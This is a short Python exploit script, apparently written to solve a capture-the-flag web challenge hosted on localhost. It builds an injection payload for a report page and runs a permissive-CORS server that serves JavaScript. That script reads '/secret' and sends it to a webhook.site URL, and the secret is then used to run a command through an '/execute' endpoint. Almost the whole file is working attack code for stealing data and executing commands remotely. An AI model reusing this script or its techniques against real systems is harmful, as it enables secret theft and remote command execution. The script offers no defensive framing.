#!/usr/bin/env python3

EXPLOIT = '''
On Report Page after setting up ngrok

http://localhost:1337//adc9-115-186-60-114.ngrok-free.app","username":"hashi-san","pass":"sh0wd0wn
'''

import sys
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv) == 2 and sys.argv[1]:
    print("Super Secret Found")
    r = requests.post(f"http://localhost:1337/execute", data={
        "secret": sys.argv[1],
        "command": "whoami"
    })
    print(r.text)
    sys.exit(0)

class Redirect(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, x-requested-with')
        self.end_headers()

    def do_GET(self):
        self.send_response(200)

        ## Javascript content
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, x-requested-with')
        self.end_headers()
        self.wfile.write(b'''
            fetch('/secret').then((resp) => resp.text()).then((data) => {fetch('https://webhook.site/315829c2-5553-4899-8711-bef85dc153bc/?data=' + data);});
        ''')

HTTPServer(("0.0.0.0", 9000), Redirect).serve_forever()